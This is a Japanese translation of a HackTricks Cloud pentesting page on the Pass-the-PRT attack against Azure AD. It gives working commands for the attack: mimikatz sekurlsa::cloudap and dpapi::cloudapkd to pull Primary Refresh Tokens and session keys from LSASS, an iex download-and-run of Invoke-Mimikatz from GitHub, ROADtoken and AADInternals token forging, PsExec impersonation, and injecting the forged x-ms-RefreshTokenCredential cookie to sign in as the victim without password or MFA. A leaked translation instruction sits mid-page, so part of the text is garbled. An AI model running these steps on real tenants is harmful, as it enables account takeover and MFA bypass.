# Az - PRTのパス

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社の広告を見たい**場合や、**PEASSの最新バージョンを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを入手する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローする。
* **ハッキングのトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## PRTとは

**Primary Refresh Token (PRT)** は、Windows 10およびモバイルOSのユーザーに**シングルサインオン（SSO）**体験を提供するために使用されます。

SSOをサポートするデバイスにログインすると、Windowsは**クラウド認証プロバイダーと通信し、資格情報を検証**し、**PRT**と**セッションキー**を**返します**。**PRTはLSASSに保存**され、**セッションキーはローカルデバイスのTPMで再暗号化**され、PRTと一緒に保存されます。

その後、**ブラウザ**がクラウド上のリソースにアクセスしようとすると、**PRTクッキー**が使用されます。

発行されると、**PRT**は**14日間有効**であり、ユーザーがデバイスをアクティブに使用している限り**継続的に更新**されます。PRTには、RDPにアクセスする際に**Windows Hello**または**Windowsアカウントマネージャー**を使用する場合にのみ**MFAクレーム**があります。

これを使用して、アプリケーションへのアクセスとリフレッシュトークンを取得できます。

これがどのように機能するかの詳細については、[**ドキュメント**](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token)または[**このページ**](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)を参照してください。

### PRTの有無を確認する
```
Dsregcmd.exe /status
```
## Pass-the-PRT

### ステップ

1. **LSASSからPRTを抽出**し、後で保存します。
2. **セッションキーを抽出**します。これはローカルデバイスによって発行され、再暗号化されるため、**DPAPIマスターキーを使用してこれを復号化する必要があります**。DPAPIについての詳細は、[**HackTricks**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)リンクまたは[**Pass-the-cookie attack**](az-pass-the-cookie.md)を参照してください。
3. 復号化されたセッションキーを使用して、PRTとコンテキストの派生キーを取得します。これは、**PRTクッキーを作成するために必要です**。派生キーは、クッキーのJWTに署名するために使用されます。Dirk-janは、このプロセスを[ここで](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)詳しく説明しています。

これで、自分自身のPRTクッキーに署名するために必要なすべてのものを持っています。残りの手順は、他のシステムから実行できます。

* PRT、派生キー、およびコンテキストを使用して、新しいPRTクッキーを作成します。
* クッキーをブラウザセッションにインポートします（Chromeを使用します）。
* 以上です！パスワードを知る必要もMFAプロンプトを処理する必要もなく、そのユーザーとして認証されるはずです。

### 攻撃 - Roadtoken

この方法についての詳細については、[**この投稿**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)を参照してください。有効なPRTクッキーを生成するためには、最初にノンスが必要です。以下のコマンドで取得できます。
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
または、[**roadrecon**](https://github.com/dirkjanm/ROADtools)を使用することもできます:
```powershell
roadrecon auth prt-init
```
次に、[**roadtoken**](https://github.com/dirkjanm/ROADtoken)を使用して新しいPRTを取得することができます（ユーザーのプロセスからツールを実行して攻撃します）：
```powershell
.\ROADtoken.exe <nonce>
```
以下は、/hive/hacktricks-cloud/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.mdというファイルからのコンテンツです。関連する英文を日本語に翻訳し、翻訳を保持したまま、正確に同じmarkdownおよびhtmlの構文を返してください。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびmarkdownタグなどは翻訳しないでください。また、翻訳とmarkdown構文以外の追加の内容は追加しないでください。
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

次に、**生成されたクッキー**を使用して、Azure AD **Graph**またはMicrosoft Graphを使用して**トークンを生成**し、**ログイン**することができます。
```powershell
roadrecon auth --prt-cookie <prt_cookie>

Connect-AzureAD --AadAccessToken <token> --IaccountId <acc_ind>
```
### 攻撃 - AADInternalsを使用する

`Get-AADIntUserPRTToken`は、Azure ADに参加しているかハイブリッドに参加しているコンピュータからユーザーのPRTトークンを取得します。PRTトークンを取得するために`BrowserCore.exe`を使用します。
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
もしくは、Mimikatzから取得した値を使用して、AADInternalsを使ってトークンを生成することもできます:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
[https://login.microsoftonline.com](https://login.microsoftonline.com)にアクセスし、login.microsoftonline.comのすべてのクッキーを削除し、新しいクッキーを入力してください。
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
次に、[https://portal.azure.com](https://portal.azure.com)にアクセスしてください。

{% hint style="danger" %}
残りの設定はデフォルトのままにしてください。ページを更新してもクッキーが消えないことを確認してください。もし消えてしまった場合は、間違いがある可能性があり、手順をやり直す必要があります。消えなければ、問題ありません。
{% endhint %}

### 攻撃 - Mimikatz

{% hint style="warning" %}
2021年8月以降の修正により、他のユーザーのPRTトークンを取得することはできません（ローカル管理者は他のユーザーのPRTにアクセスできませんが、自分のPRTにはアクセスできます）。
{% endhint %}

{% hint style="danger" %}
**この方法では、前回私にはうまくいきませんでした**
{% endhint %}

**mimikatz**を使用してPRTを抽出できます：
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**Prt**とラベル付けされた部分を**コピー**して保存します。\
また、下にハイライトされているセッションキーまたは「**ProofOfPosessionKey**」も抽出します。これは暗号化されており、DPAPIマスターキーを使用して復号する必要があります。

<figure><img src="../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
PRTデータが表示されない場合は、デバイスがAzure ADに参加していないか、古いバージョンのWindows 10を実行している可能性があります。
{% endhint %}

セッションキーを**復号化**するには、**特権を昇格**して**SYSTEM**として実行し、**DPAPIマスターキーを使用して復号化する**必要があります。次のコマンドを使用できます。
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

今、あなたは両方のContext値をコピーしたいと思います：

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

そして、派生キーの値もコピーします：

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

最後に、この情報を使用して**PRTクッキーを生成**することができます：
```
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

[https://login.microsoftonline.com](https://login.microsoftonline.com)にアクセスし、login.microsoftonline.comのすべてのクッキーを削除して新しいクッキーを入力します。
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
次に、[https://portal.azure.com](https://portal.azure.com)に移動します。

{% hint style="danger" %}
残りの部分はデフォルトのままにしてください。ページを更新してもクッキーが消えないことを確認してください。もし消えてしまった場合は、間違いがある可能性があり、手順をやり直す必要があります。消えない場合は、問題ありません。
{% endhint %}

## 参考文献

* この投稿は主に[https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)から抜粋されました。

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSにアクセスしたい**場合、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご確認ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしてください🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubリポジトリに提出してください。**

</details>
